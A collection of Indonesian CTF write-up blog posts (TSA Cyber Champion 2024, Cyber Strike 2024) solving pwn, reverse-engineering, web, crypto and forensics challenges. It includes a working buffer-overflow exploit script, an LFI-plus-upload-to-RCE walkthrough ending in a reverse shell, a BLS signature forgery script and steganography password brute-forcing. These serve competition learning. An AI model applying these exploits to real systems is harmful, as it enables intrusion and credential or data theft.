[{"content":"Deskripsi Soal Di soal ini, diberikan sebuah source code dan juga server yang bisa saya hubungkan. Ketika saya coba akses servernya, tampilannya seperti ini:\nLalu, saya cek kode PWN-nya. Kode PWN ini adalah ELF 64-bit dengan karakteristik sebagai berikut:\nDari informasi tersebut, ada beberapa hal yang perlu diperhatikan:\nTidak ada stack canary (memungkinkan buffer overflow). No PIE (alamat fungsi tetap/tidak random). Stack executable (memungkinkan eksekusi shellcode). Analisis Program Saya menganalisis program ini menggunakan Ghidra.\nHasil decompile pada fungsi main menunjukkan bahwa program meminta input nama user menggunakan fungsi gets(), yang rentan terhadap buffer overflow:\nSelain itu, ada juga fungsi secret.\nFungsi secret ini tidak dipanggil dalam program normal. Jadi, tujuan kita adalah memanggil fungsi ini.\nEksploitasi Saya akan melakukan eksploitasi dengan tahapan sebagai berikut:\nMenghitung Offset:\nBuffer size: 128 bytes Saved RBP: 8 bytes Total offset: 136 bytes Mendapatkan Alamat Fungsi dan Gadget:\nSaya menggunakan pwntools untuk mendapatkan alamat fungsi secret dan gadget ret.\n1 2 secret_addr = elf.symbols[\u0026#39;secret\u0026#39;] ret = rop.find_gadget([\u0026#39;ret\u0026#39;])[0] Membuat Payload:\nSaya membuat payload untuk melakukan buffer overflow dan memanggil fungsi secret.\n1 2 3 4 5 6 padding = b\u0026#34;A\u0026#34; * 136 payload = flat([ padding, p64(ret), p64(secret_addr) ]) Eksploitasi:\nSaya mengirim payload ke server dan berinteraksi untuk mendapatkan flag.\n1 2 3 4 io = remote(HOST, PORT) io.recvuntil(b\u0026#34;Nama: \u0026#34;) io.send(payload) io.interactive() Berikut adalah script exploit lengkap yang saya gunakan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 from pwn import * # setting context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; context.endian = \u0026#39;little\u0026#39; context.word_size = 64 context.log_level = \u0026#39;debug\u0026#39; # koneksi details HOST = \u0026#34;0.cloud.chals.io\u0026#34; PORT = 32229 # load binary elf = ELF(\u0026#39;./pwn\u0026#39;) # dapatkan alamat fungsi secret secret_addr = elf.symbols[\u0026#39;secret\u0026#39;] print(f\u0026#34;[*] Secret function address: {hex(secret_addr)}\u0026#34;) # cari ROP gadget untuk stack alignment rop = ROP(elf) ret = rop.find_gadget([\u0026#39;ret\u0026#39;])[0] print(f\u0026#34;[*] RET gadget address: {hex(ret)}\u0026#34;) def create_payload(): # fuffer overflow payload dengan stack alignment padding = b\u0026#34;A\u0026#34; * 136 # Buffer + saved rbp (bisa disesuaikan) # stack alignment + return to secret payload = flat([ padding, # padding sampai return address p64(ret), # stack alignment p64(secret_addr) # alamat fungsi secret ]) return payload def exploit(): try: # koneksi ke server io = remote(HOST, PORT) # terima prompt print(io.recvuntil(b\u0026#34;Nama: \u0026#34;).decode()) # buat dan kirim payload payload = create_payload() print(f\u0026#34;[*] Sending payload of length: {len(payload)}\u0026#34;) io.send(payload) sleep(0.5) # kirim beberapa perintah untuk memastikan shell aktif io.sendline(b\u0026#34;echo \u0026#39;Shell aktif\u0026#39;\u0026#34;) io.sendline(b\u0026#34;ls -la\u0026#34;) io.sendline(b\u0026#34;cat flag.txt\u0026#34;) # interactive mode io.interactive() except EOFError: print(\u0026#34;Got EOF. Connection closed.\u0026#34;) except Exception as e: print(f\u0026#34;Error: {str(e)}\u0026#34;) finally: io.close() if __name__ == \u0026#34;__main__\u0026#34;: exploit() Hasil Setelah menjalankan script exploit, berhasil mendapatkan akses shell!\nSaya melihat ada sebuah file bernama flag.txt.\nSaya coba baca isi file flag.txt.\nSolusi Flag: TSA{PWN_101_2d2de462ebe19a876eb74b1c9c053120}\n","date":"2024-11-10T19:00:07+07:00","image":"https://example.com/p/tsa-cyber-champion-2024-pwn/image-37_hu13957898655878565507.png","permalink":"https://example.com/p/tsa-cyber-champion-2024-pwn/","title":"[TSA Cyber Champion 2024] - Pwn"},{"content":"Deskripsi Soal Pada soal ini, saya diberikan sebuah file bernama main.\nPertama, saya coba cek dulu file main ini.\nLalu, saya coba jalankan programnya.\nProgram meminta inputan \u0026ldquo;FLAG\u0026rdquo;. Saya coba masukkan sembarang, dan program langsung berhenti. Oke, sepertinya kita harus menganalisis program ini lebih lanjut.\nAnalisis Program Untuk menganalisis program ini, saya menggunakan Ghidra.\nSetelah dianalisis, saya menemukan fungsi m (main) yang berhasil di-decompile. Berikut adalah kode decompile-nya:\nSelain fungsi main, saya juga menemukan dua fungsi penting lainnya, yaitu cl dan cr. Fungsi cl ini sepertinya untuk validasi bagian kiri dari flag, sedangkan cr untuk validasi bagian kanan.\nFungsi cl() Berikut adalah kode dari fungsi cl():\nFungsi cr() Berikut adalah kode dari fungsi cr():\nDari analisis kode, saya menyimpulkan cara kerja programnya adalah sebagai berikut:\nInput flag dibagi menjadi dua bagian sama panjang, yaitu bagian kiri (l) dan bagian kanan (r). Fungsi cl() mengecek bagian kiri dengan operasi XOR. Fungsi cr() mengecek bagian kanan dengan operasi XOR terhadap bagian kiri. Membuat Solver Karena saya sudah memahami cara kerja program, saya membuat script solver menggunakan Python untuk mendapatkan flag. Berikut adalah script solver yang saya buat:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 def get_left_part(length): # values from cl() function target_values = [ 0xeb, 0xed, 0xfc, 0xc7, 0xe9, 0xff, 0xe6, 0x89, 0x87, 0x87, 0xea, 0x81, 0x81, 0x80, 0xd4, 0xd2, 0x99, 0xcf, 0x99, 0x94, 0x9a, 0x9e ] # solve for left part: c[i] ^ 0xbf ^ i = target # Therefore: c[i] = target ^ 0xbf ^ i left = \u0026#34;\u0026#34; for i in range(len(target_values)): char = target_values[i] ^ 0xbf ^ i left += chr(char) return left def get_right_part(left_part): # Values from cr() function target_values = [ 0x37, 0x60, 0x21, 0x41, 0x33, 0x22, 0x6e, 0x06, 0x5a, 0x0f, 0x31, 0x0f, 0x5b, 0x5d, 0x5f, 0x0c, 0x40, 0x40, 0x13, 0x19, 0x47, 0x5c ] # Solve for right part: (r[i] ^ l[i]) ^ i = target # Therefore: r[i] = (target ^ i) ^ l[i] right = \u0026#34;\u0026#34; for i in range(len(target_values)): char = (target_values[i] ^ i) ^ ord(left_part[i]) right += chr(char) return right def main(): # Get left part of the flag left_part = get_left_part(22) # Length based on array sizes # Get right part of the flag using left part right_part = get_right_part(left_part) # combine to get full flag flag = left_part + right_part print(\u0026#34;Flag:\u0026#34;, flag) if __name__ == \u0026#34;__main__\u0026#34;: main() Saya menjalankan script solver ini, dan mendapatkan flag-nya!\nSolusi Flag: TSA{RE_101_522eb6a4814c2b9eb70b7d1eb4af052b}\n","date":"2024-11-10T19:00:07+07:00","image":"https://example.com/p/tsa-cyber-champion-2024-reverse-engineering-101-writeup/image-31_hu17578516614859140533.png","permalink":"https://example.com/p/tsa-cyber-champion-2024-reverse-engineering-101-writeup/","title":"[TSA Cyber Champion 2024] - Reverse Engineering 101 Writeup"},{"content":"Deskripsi Soal Soal ini hanya memberikan sebuah tautan (link) website tanpa deskripsi tambahan, sehingga pendekatan blackbox testing diperlukan.\nURL: https://cyberchampion-web-101.chals.io/\nMirror: http://103.196.154.155:20000/\nTampilan awal website:\nWebsite ini memiliki dua menu utama: \u0026ldquo;Ping\u0026rdquo; dan \u0026ldquo;File Up\u0026rdquo;.\nAnalisis Awal Menu Ping Menu \u0026ldquo;Ping\u0026rdquo; memiliki dua potensi kerentanan:\nLocal File Inclusion (LFI): Parameter page pada URL https://cyberchampion-web-101.chals.io/index.php?page=ping.php terlihat mencurigakan dan mungkin rentan terhadap LFI. Command Injection: Input pada fitur \u0026ldquo;Ping\u0026rdquo; mungkin rentan terhadap Command Injection. Eksplorasi LFI Mencoba mengakses URL https://cyberchampion-web-101.chals.io/index.php?page= menghasilkan pesan error yang mengungkapkan path website: /var/www/html/pages/. Ini mengonfirmasi bahwa website menggunakan fungsi include() untuk memanggil file.\nDengan informasi ini, dicoba melakukan path traversal untuk mengakses file sensitif, seperti /etc/passwd.\nhttps://cyberchampion-web-101.chals.io/index.php?page=../../../../etc/passwd\nEksploitasi LFI berhasil, yang berarti website ini memiliki celah LFI.\nPercobaan yang Gagal Beberapa percobaan berikut dilakukan, namun tidak berhasil:\nMencoba menggunakan wrapper dengan Burp Suite dan ekstensi Hackbar.\nMencoba mengakses /proc/self/environ (berdasarkan referensi dari https://www.exploit-db.com/papers/12886).\nEksplorasi Command Injection Mencoba fitur \u0026ldquo;Ping\u0026rdquo; dengan input google.com.\nFitur ini tampaknya mengeksekusi perintah \u0026ldquo;ping\u0026rdquo;. Dicoba melakukan Command Injection dengan input:\ngoogle.com; id\nInput ini seharusnya mengeksekusi perintah ping dan id. Jika dicoba di Linux, hasilnya akan seperti ini:\nNamun, ketika dicoba pada website, hasilnya kosong (blank).\nBerbagai upaya bypass dicoba, tetapi tidak berhasil.\nMenu File Up Karena upaya sebelumnya tidak berhasil, dicoba menu \u0026ldquo;File Up\u0026rdquo;.\nMencoba mengunggah file gambar.\nSetelah di-submit, tidak ada informasi apakah file berhasil diunggah atau tidak, dan tidak ada informasi lokasi file jika berhasil diunggah.\nEksploitasi File Upload Menggunakan Burp Suite untuk menganalisis proses upload. Awalnya, mencoba mengunggah file dengan nama yang sama (\u0026ldquo;sad.jpg\u0026rdquo;), tetapi gagal. Kemudian, mencoba dengan nama \u0026ldquo;sad1.jpg\u0026rdquo; dan berhasil.\nPesan \u0026ldquo;Image Successfully uploaded!\u0026rdquo; dan tautan ke file yang diunggah diberikan:\nhttp://cyberchampion-web-101.chals.io/uploads/b234baed21817d689650251d80d39293.jpg\nMengakses tautan tersebut menunjukkan bahwa file berhasil diunggah.\nEksploitasi Lanjutan (LFI to RCE) Mengacu pada artikel tentang memanfaatkan LFI untuk mencapai RCE:\nhttps://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2/\nArtikel tersebut menjelaskan bagaimana menggabungkan LFI dan File Upload untuk mencapai RCE. Kode PHP disisipkan ke dalam file gambar, kemudian diunggah. Selanjutnya, LFI digunakan untuk mengakses file gambar tersebut dan mengeksekusi kode PHP yang ada di dalamnya.\nBypass dengan Header \u0026ldquo;GIF98a;\u0026rdquo; Mencoba bypass dengan menyisipkan header \u0026ldquo;GIF98a;\u0026rdquo; (berdasarkan referensi dari https://github.com/malware-d/template/blob/master/example_attack/Bypassing%20File%20Upload%20Restrictions.md).\nFile sad.jpg diubah dengan menghapus semua isinya dan menggantinya dengan kode PHP yang disisipkan header \u0026ldquo;GIF98a;\u0026rdquo;.\nMencoba mengakses file melalui LFI dengan menambahkan parameter cmd:\nhttps://cyberchampion-web-101.chals.io/index.php?page=../uploads/9c090a873b2789d317eb5bb5fe165329.jpg?cmd=id\nHasilnya gagal.\nKemudian, mencoba dengan format yang berbeda:\nhttps://cyberchampion-web-101.chals.io/index.php?page=../uploads/9c090a873b2789d317eb5bb5fe165329.jpg\u0026amp;cmd=id\nEksploitasi berhasil! Sekarang, dicoba melakukan reverse shell untuk mendapatkan akses yang lebih leluasa.\nReverse Shell Menggunakan ngrok untuk melakukan port forwarding.\nPort 1337 diaktifkan.\nMenggunakan reverse shell dari Pentest Monkey (https://www.revshells.com/).\nSkrip reverse shell disesuaikan dengan port yang diberikan oleh ngrok.\nSkrip PHP yang diunggah diubah dengan skrip reverse shell. Kemudian, diakses melalui LFI.\nNetcat mendengarkan pada port 1337.\nReverse shell berhasil!\nMencari Flag Setelah mendapatkan reverse shell, dicari file yang berisi flag.\nDitemukan file bernama flag. Langsung saja dicek isinya.\nSolusi Flag: TSA{Web_Hacking_101_c7319b0bd96f9d01981bbf52ebb7027f}\n","date":"2024-11-10T19:00:07+07:00","image":"https://example.com/p/tsa-cyber-champion-2024-web-exploit-101-writeup/image-8_hu15192777862788380212.png","permalink":"https://example.com/p/tsa-cyber-champion-2024-web-exploit-101-writeup/","title":"[TSA Cyber Champion 2024] - Web Exploit 101 Writeup"},{"content":"[TSA Cyber Champion 2024] Cryptography 101 Writeup Writeup ini akan membahas bagaimana saya menyelesaikan soal Cryptography 101 dan Cryptomata dari TSA Cyber Champion 2024. Soal-soal ini melibatkan pemahaman tentang RSA dan BLS Signature.\nCryptography 101 Deskripsi Soal Pada soal ini, saya diberikan sebuah file chall.txt. Isi dari file chall.txt ini adalah sebagai berikut:\nFile ini berisi ciphertext (c), modulus (n), dan exponent publik (e), yang merupakan komponen dasar dalam enkripsi RSA. Tujuan saya adalah mendekripsi c untuk mendapatkan flag.\nAnalisis Untuk menyelesaikan soal ini, saya perlu melakukan beberapa perhitungan dan membuat kode program. Secara garis besar, langkah-langkahnya adalah:\nFaktorisasi Nilai n:\nModulus n merupakan hasil perkalian dua bilangan prima p dan q. Dengan faktorisasi ini, saya bisa mendapatkan nilai p dan q, yang diperlukan untuk menghitung nilai φ(n) (Euler\u0026rsquo;s Totient Function). Menghitung φ(n):\nLangkah selanjutnya adalah menghitung φ(n), yang dirumuskan sebagai (p-1) * (q-1). Nilai φ(n) ini penting untuk mencari private exponent (d). Menghitung Private Exponent d:\nNilai private exponent d dihitung sebagai invers modular dari e terhadap φ(n), menggunakan fungsi pow(e, -1, φ(n)). Nilai d ini akan menjadi kunci privat yang digunakan untuk mendekripsi c. Dekripsi c menggunakan d dan n:\nDengan d yang diperoleh, saya dapat mendekripsi c menggunakan rumus m = c^d mod n, di mana m adalah plaintext atau flag. Konversi Hasil Dekripsi ke Plaintext:\nHasil dekripsi (m) adalah angka besar yang perlu dikonversi ke dalam bentuk string agar bisa dibaca. Saya akan mengonversi m ke format bytes dan mendekodenya ke UTF-8 untuk mendapatkan flag. Solver Berikut adalah script solver yang saya buat menggunakan Python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 import sympy # fungsi untuk faktorasi n menjadi dua bilangan prima p dan q def factor_n(n): factors = sympy.factorint(n) if len(factors) == 2: p, q = list(factors.keys()) return p, q else: raise ValueError(\u0026#34;Faktorasi n tidak menghasilkan dua bilangan prima.\u0026#34;) # fungsi untuk menghitung φ(n) def compute_phi(p, q): return (p - 1) * (q - 1) # fungsi untuk menghitung d (private exponent) menggunakan invers modular def compute_d(e, phi_n): return pow(e, -1, phi_n) # fungsi untuk mendekripsi ciphertext menggunakan d dan n def decrypt(c, d, n): return pow(c, d, n) def main(): # chall.txt c = 231722077914684998818993776518942509384465803531548983146869754932667754136315007943497593396644630089073196170276638447665765624960333289097324447779290700092664403080584161276778064977902852018557301618273474139777712464709585187730351308079009718870031364399745764326436147001877583703027251271265576350621173 e = 65537 n = 257208938346934642693512128888810986151634836498153528507638790770764504946719195736987613302526116425873247750032929224521429342437621496424825810959518932424007107126934957421561529561264636001476988808843995824395131838577901446930016348590793828420808295335603083382120208905347497068915850813369038886980997 # 1. faktorasi n print(\u0026#34;Faktorasi n...\u0026#34;) p, q = factor_n(n) print(f\u0026#34;p: {p}, q: {q}\u0026#34;) # 2. hitung φ(n) print(\u0026#34;Menghitung φ(n)...\u0026#34;) phi_n = compute_phi(p, q) print(f\u0026#34;φ(n): {phi_n}\u0026#34;) # 3. hitung d (private exponent) print(\u0026#34;Menghitung d...\u0026#34;) d = compute_d(e, phi_n) print(f\u0026#34;d: {d}\u0026#34;) # 4. dekripsi ciphertext untuk mendapatkan m (flag) print(\u0026#34;Mendekripsi ciphertext...\u0026#34;) m = decrypt(c, d, n) # mengonversi hasil deskripsi ke dalam bentuk teks # hasil dekripsi berupa angka yang harus diubah menjadi teks (string). m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=\u0026#39;big\u0026#39;) try: flag = m_bytes.decode(\u0026#39;utf-8\u0026#39;) print(f\u0026#34;Flag: {flag}\u0026#34;) except UnicodeDecodeError: print(f\u0026#34;Hasil dekripsi berupa bytes yang tidak dapat didekode ke teks UTF-8: {m_bytes}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Setelah menjalankan script solver, saya mendapatkan flag-nya!\nSolusi Flag: TSA{Crypto_101_d5b55ff525198ba6}\nCryptography - [cryptomata] Deskripsi Soal Pada soal cryptomata, saya diberikan sebuah deskripsi untuk penyelesaian soal, akses netcat untuk melakukan koneksi ke server soal, dan juga sebuah file zip yang berisi source code dari soal tersebut.\nPada deskripsi soalnya, soal ini dibuat oleh AI (ChatGPT) dan diberikan URL ChatGPT-nya: https://chatgpt.com/share/6729a0f4-ebd0-800e-96bd-d2e2522210bb\nAnalisis Dari deskripsi, pembuat soal ingin menerapkan tanda tangan BLS dengan py_ecc.optimized_bls12_381. Selain itu, probset ingin argumen fungsi berpasangan harus berpasangan (G2, G1).\nServer menggunakan library py_ecc untuk implementasi BLS signature dengan komponen utama:\nKetika saya coba koneksikan ke server, tampilannya seperti ini:\nUntuk programnya, bisa dilihat pada source code zip yang telah diekstrak pada file challange.py.\nDari kode tersebut, saya mengetahui bahwa server ini memiliki beberapa fitur:\nSign Up: Mendaftar user baru dan mendapatkan token. Sign In: Login dengan username + token. Get Flag: Hanya bisa diakses oleh admin. Dari BLS signature ini, saya tahu bahwa ia punya sifat homomorphic. Artinya:\nJika kita punya signature A = sk * H(user) Dan kita mau signature B = sk * H(admin) Kita bisa pakai matematika modular untuk transformasi signature A ke B Eksploitasi Tahapan eksploitasinya adalah sebagai berikut:\nDaftar sebagai user biasa untuk mendapatkan token. Hitung nilai hash untuk user dan admin. Hitung scalar untuk transformasi signature. Generate admin signature. Login sebagai admin dan ambil flag. Berikut adalah script exploit yang saya buat:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 from pwn import * from py_ecc.optimized_bls12_381 import G1, G2, add, multiply, pairing, normalize, FQ, neg import hashlib from py_ecc.optimized_bls12_381.optimized_curve import curve_order # Enable debugging context.log_level = \u0026#39;debug\u0026#39; def hash_to_G1(message: bytes) -\u0026gt; tuple: hash_val = int.from_bytes(hashlib.sha256(message).digest(), \u0026#39;big\u0026#39;) % curve_order return multiply(G1, hash_val) def serialize(point): xy = normalize(point) b = int.to_bytes(int(xy[0]), 48, \u0026#39;big\u0026#39;) b += int.to_bytes(int(xy[1]), 48, \u0026#39;big\u0026#39;) return b.hex() def deserialize(token): token_bytes = bytes.fromhex(token) x = int.from_bytes(token_bytes[:48], \u0026#39;big\u0026#39;) y = int.from_bytes(token_bytes[48:], \u0026#39;big\u0026#39;) return (FQ(x), FQ(y), FQ(1)) def exploit(): try: # Connect to the server conn = remote(\u0026#39;0.cloud.chals.io\u0026#39;, 32571, timeout=20) print(\u0026#34;[+] Connected to server\u0026#34;) # Get a user signature conn.recvuntil(b\u0026#39;$\u0026gt; \u0026#39;) conn.sendline(b\u0026#39;2\u0026#39;) # Sign Up conn.recvuntil(b\u0026#39;Username: \u0026#39;) username = b\u0026#39;test_user\u0026#39; conn.sendline(username) conn.recvuntil(b\u0026#34;Here\u0026#39;s your credential token: \u0026#34;) user_token = conn.recvline().strip().decode() user_sig = deserialize(user_token) print(f\u0026#34;[+] Got signature for test user\u0026#34;) # Calculate necessary points H_user = hash_to_G1(username) H_admin = hash_to_G1(b\u0026#39;admin\u0026#39;) # Calculate scalar needed to transform user signature to admin signature # If sig_user = sk * H_user, we need to find x where: # sig_admin = sk * H_admin = x * sig_user # Therefore: x = H_admin * H_user^(-1) h_user_val = int.from_bytes(hashlib.sha256(username).digest(), \u0026#39;big\u0026#39;) % curve_order h_admin_val = int.from_bytes(hashlib.sha256(b\u0026#39;admin\u0026#39;).digest(), \u0026#39;big\u0026#39;) % curve_order scalar = (h_admin_val * pow(h_user_val, -1, curve_order)) % curve_order # Generate admin signature admin_sig = multiply(user_sig, scalar) admin_token = serialize(admin_sig) print(f\u0026#34;[+] Forged admin token: {admin_token}\u0026#34;) # Try to login as admin conn.recvuntil(b\u0026#39;$\u0026gt; \u0026#39;) conn.sendline(b\u0026#39;1\u0026#39;) # Sign In conn.recvuntil(b\u0026#39;Username: \u0026#39;) conn.sendline(b\u0026#39;admin\u0026#39;) conn.recvuntil(b\u0026#39;Token: \u0026#39;) conn.sendline(admin_token.encode()) # Check if login successful response = conn.recvuntil(b\u0026#39;$\u0026gt; \u0026#39;).decode() if \u0026#34;Sign-in success!\u0026#34; in response: print(\u0026#34;[+] Successfully logged in as admin!\u0026#34;) conn.sendline(b\u0026#39;2\u0026#39;) # Get flag flag = conn.recvline().decode() print(f\u0026#34;[+] Flag: {flag}\u0026#34;) else: print(\u0026#34;[-] Login failed\u0026#34;) print(f\u0026#34;Response: {response}\u0026#34;) except Exception as e: print(f\u0026#34;[-] Error occurred: {str(e)}\u0026#34;) finally: conn.close() if __name__ == \u0026#39;__main__\u0026#39;: exploit() Setelah menjalankan script exploit, saya berhasil mendapatkan flag!\nSolusi Flag: TSA{proof_that_you_are_smarter_than_AI_3a78250f}\n","date":"2024-11-10T19:00:07+07:00","image":"https://example.com/p/tsa-cyber-champion-2024-cryptography-101-writeup/image-50_hu15199121315725173941.png","permalink":"https://example.com/p/tsa-cyber-champion-2024-cryptography-101-writeup/","title":"[TSA Cyber Champion 2024] Cryptography 101 Writeup"},{"content":"Cyber Strike Competition 1.0 Crypto Eksplorasi File Terenkripsi Deskripsi Soal Pada soal ini, deskripsi menyebutkan bahwa dalam file zip \u0026ldquo;secret_data.zip\u0026rdquo; terdapat file bernama \u0026ldquo;secret_data.txt\u0026rdquo; yang berisi informasi sensitif, yaitu flag. Deskripsi juga memberikan petunjuk bahwa untuk menyelesaikan soal ini, kita perlu mendekripsi teks terenkripsi dalam file \u0026ldquo;secret_data.txt\u0026rdquo;.\nAnalisis dan Pemecahan Masalah Saya memulai dengan mengekstrak file \u0026ldquo;secret_data.zip\u0026rdquo; dan menyimpannya ke dalam folder \u0026lsquo;secret\u0026rsquo;.\nSetelah diekstrak, saya menemukan file \u0026ldquo;secret_data.txt\u0026rdquo; sesuai dengan deskripsi soal. Berikut adalah isi dari file tersebut:\n1 aX5sUV5CQ1l1Q1l1XkJPdVlPSVhPXnVMRktNVw== Isi dari \u0026ldquo;secret_data.txt\u0026rdquo; terlihat seperti hasil enkripsi Base64. Namun, ketika saya mencoba mendekodenya menggunakan CyberChef (https://gchq.github.io/CyberChef/) dengan fitur \u0026ldquo;Magic\u0026rdquo;, hasilnya tidak sesuai harapan.\nCyberChef awalnya mendeteksi sebagai Base85. Kemudian, saya mencoba menghapus bagian \u0026ldquo;==\u0026rdquo; dan mendekode dengan fitur \u0026ldquo;Magic\u0026rdquo; dari CyberChef. Hasilnya adalah:\n1 i~lQ^BCYuCYu^BOuYOIXO^uLFKMW Hasil ini masih tampak acak dan menunjukkan bahwa teks tersebut mungkin masih terenkripsi. Kemungkinan metode enkripsi yang digunakan perlu diidentifikasi lebih lanjut, misalnya Caesar cipher, XOR cipher, dan lain-lain.\nUntuk langkah selanjutnya, saya mencoba menggunakan XOR Cipher. Saya melakukan brute-force XOR dengan asumsi bahwa kunci mungkin hanya terdiri dari satu karakter ASCII.\nBerikut adalah program solve.py yang saya gunakan:\nSaya langsung menjalankan program solve.py.\nHasil dari brute-force XOR menunjukkan dua kunci, yaitu \u0026ldquo;10\u0026rdquo; dan \u0026ldquo;42\u0026rdquo;, yang berhasil mengubah teks menjadi plaintext. Namun, ketika saya mencoba mengirimkan flag yang dihasilkan, ternyata flag yang benar adalah CTF{this_is_the_secret_flag}.\nSolusi Flag: CTF{this_is_the_secret_flag}\n","date":"2024-10-12T16:54:04+07:00","image":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-crypto/image-39_hu6067112949351542708.png","permalink":"https://example.com/p/cyber-strike-competition-1.0-ctf-2024-crypto/","title":"[Cyber Strike Competition 1.0 CTF 2024] - Crypto"},{"content":"Writeup Forensic CTF Log yang Tersembunyi Deskripsi Soal Pada soal ini, saya diberikan sebuah file zip yang berisi sebuah petunjuk tersembunyi.\nAnalisis dan Pemecahan Masalah Untuk menyelesaikan soal ini, langkah pertama yang saya lakukan adalah mengekstrak file zip tersebut dan menyimpannya ke dalam folder \u0026ldquo;forensic\u0026rdquo;.\nSetelah diekstrak, ternyata hanya ada satu file, yaitu \u0026ldquo;important.txt\u0026rdquo;.\nNamun, setelah saya periksa, isi dari file \u0026ldquo;important.txt\u0026rdquo; tidak memberikan informasi apapun. Karena tidak ada file lain, saya mencoba melakukan pengecekan pada file zip itu sendiri menggunakan \u0026ldquo;xxd\u0026rdquo;.\nTernyata, di dalam file zip tersebut terdapat sebuah flag!\nSolusi Flag: CTF{askdjaskjd123280912}\nMystery in the Files Deskripsi Soal Pada soal ini, saya diberikan sebuah file barangbukti.zip yang berisi banyak subfolder dan file teks sesuai dengan deskripsi soal.\nAnalisis dan Pemecahan Masalah Setelah mengekstrak file barangbukti.zip, saya menemukan banyak subfolder dan file teks.\nJika saya periksa satu per satu, tentu akan memakan waktu. Oleh karena itu, saya memutuskan untuk mencari kata \u0026ldquo;CTF\u0026rdquo; pada setiap file txt dengan bantuan \u0026ldquo;grep\u0026rdquo;.\nNamun, hasilnya nihil. Tidak ada kata \u0026ldquo;CTF{\u0026rdquo; yang ditemukan.\nKemudian, saya mencoba mencari dengan kata \u0026ldquo;FLAG\u0026rdquo;.\nHasilnya, saya menemukan sebuah flag, yaitu \u0026ldquo;FLAG{Forensic_Expert_123}\u0026rdquo;. Karena format flag yang diminta adalah CTF{}, maka flag yang benar adalah CTF{Forensic_Expert_123}.\nSolusi Flag: CTF{Forensic_Expert_123}\nLabirin Data Terlupakan Deskripsi Soal Pada soal ini, saya diberikan sebuah file zip yang berisi banyak subfolder dan file txt di setiap subfoldernya.\nAnalisis dan Pemecahan Masalah Setelah mengekstrak file zip tersebut, saya menemukan struktur folder yang kompleks.\nSaya mencoba mencari kata \u0026ldquo;flag\u0026rdquo; dan \u0026ldquo;CTF{\u0026rdquo; dengan grep, tetapi hasilnya tetap tidak ditemukan.\nKemudian, saya mencoba mengikuti steg-check dari https://book.hacktricks.xyz/crypto-and-stego/stego-tricks, terutama fokus pada penggunaan foremost.\nSaya langsung mencoba menggunakan foremost.\nPada tampilan hasil foremost, tidak ada informasi yang menarik. Namun, saya menemukan adanya folder output.\nDi dalam folder output, ternyata ada folder \u0026ldquo;jpg\u0026rdquo;. Ini menandakan bahwa di dalam zip tadi terdapat file jpg. Berikut adalah isi dari file audit.txt yang dihasilkan oleh foremost.\nSetelah itu, saya langsung mengecek file jpg tersebut.\nJika dibuka, gambar jpg tersebut hanya menampilkan gambar doraemon.\nKemudian, saya mulai mencoba melakukan stegano check, seperti menggunakan file, exiftool, dan strings.\nPada bagian awal string, saya menemukan pola seperti ini:\n1 2 *456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz *56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz Saya menduga ini adalah bagian key yang mungkin berguna untuk langkah selanjutnya.\nKarena dari percobaan tadi tidak ada informasi yang menarik, saya mencoba menggunakan steghide.\nNamun, ternyata steghide meminta password.\nSaya mencoba menggunakan key yang saya temukan sebelumnya, tetapi tidak berhasil.\nOleh karena itu, saya perlu mencari password untuk membuka isi dari gambar tersebut. Untuk mencari password/passphrase, saya menggunakan tools StegCracker (https://github.com/Paradoxis/StegCracker) untuk melakukan brute force passphrase.\nSecara otomatis, StegCracker akan menggunakan wordlist dari rockyou.txt yang tersimpan di PC. Saya langsung menjalankan StegCracker.\nSetelah beberapa saat, saya berhasil menemukan password untuk gambar tersebut, yaitu \u0026ldquo;password123\u0026rdquo;. Sekarang, saya mencoba lagi steghide dengan password/passphrase \u0026ldquo;password123\u0026rdquo;.\nTernyata, di dalam gambar tersebut masih ada file txt lagi. Sekarang, saya akan mengecek file txt tersebut.\nAkhirnya, saya menemukan flag-nya!\nSolusi Flag: CTF{labirin_disini}\nTersembunyi Deskripsi Soal Pada soal kali ini, saya ditugaskan untuk mencari flag di dalam file zip.\nAnalisis dan Pemecahan Masalah Saya langsung mengekstrak file zip tersebut.\nDari hasil ekstraksi, terdapat dua file txt. Berikut adalah isi dari masing-masing file txt.\nAda sesuatu yang menarik pada file secret_message.txt.\nPada bagian \u0026ldquo;pesan penting\u0026rdquo;, terdapat kode biner. Saya mencoba mendekode kode biner ini menggunakan web https://cryptii.com/pipes/binary-decoder, tetapi hasilnya tidak bisa didekode.\nKemudian, saya menggunakan web favorit saya, yaitu CyberChef, untuk menggunakan fitur \u0026ldquo;Magic\u0026rdquo; yang secara otomatis dapat mendeteksi encoding yang digunakan.\nHasilnya, encoding yang digunakan adalah \u0026ldquo;UNIX Timestamp\u0026rdquo;, dan hasilnya berupa tanggal:\nMon 14 January 2002 12:08:21.100 UTC\nSelanjutnya, saya mencoba mendekode bagian \u0026ldquo;Flag terenkripsi: Q1RGezEyM1NyeXB0b30=\u0026rdquo;. Saya masih menggunakan CyberChef.\nHasilnya menampilkan flag!\nSolusi Flag: 